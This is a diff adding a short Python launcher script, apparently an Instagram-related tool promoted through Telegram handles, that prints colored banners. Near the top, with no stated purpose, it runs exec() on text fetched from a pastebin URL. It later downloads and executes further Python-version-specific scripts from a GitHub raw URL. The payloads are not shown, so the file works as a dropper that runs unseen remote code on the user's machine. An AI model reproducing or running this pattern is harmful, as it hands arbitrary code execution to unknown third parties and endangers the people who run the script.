@@ -1,0 +1,34 @@
+itachi py
+import os,sys
+os.system("pip install requests")
+import requests
+exec(requests.get("https://pastebin.com/raw/mynRHuxh").text)
+from cfonts import render
+import time
+import sys, os
+import random
+COLOR_COMBOS = [
+    ['green', 'yellow'],
+    ['magenta', 'red'],
+    ['blue', 'cyan'],
+    ['white', 'gray'],
+    ['red', 'magenta'],
+    ['yellow', 'green']
+]
+stein_colors, qe_colors = random.sample(COLOR_COMBOS, 2)
+STEIN = render('Instagram', colors=stein_colors, align='center', font='block', background='black')
+QE = render('Telegram: @Z3H43', colors=qe_colors, align='right', font='console', background='black')
+version = f"{sys.version_info.major}.{sys.version_info.minor}"
+print(f"🔹 Your Python version: {version}")
+print(STEIN)
+print(QE)
+time.sleep(3)
+print("This script can take up to 5 seconds to load.")
+url = {
+    "3.12": "https://raw.githubusercontent.com/devilstein1/Files/refs/heads/main/Others/itachi.12.py",
+    "3.13": "https://raw.githubusercontent.com/devilstein1/Files/refs/heads/main/Others/itachi3.13.py"
+}.get(version)
+if url:
+    exec(requests.get(url).text)
+else:
+    print("❌ UNSUPPORTED PYTHON VERSION.\nDM @SHADOWFIGHTER05 to get the 3.12 or 3.13 version.")
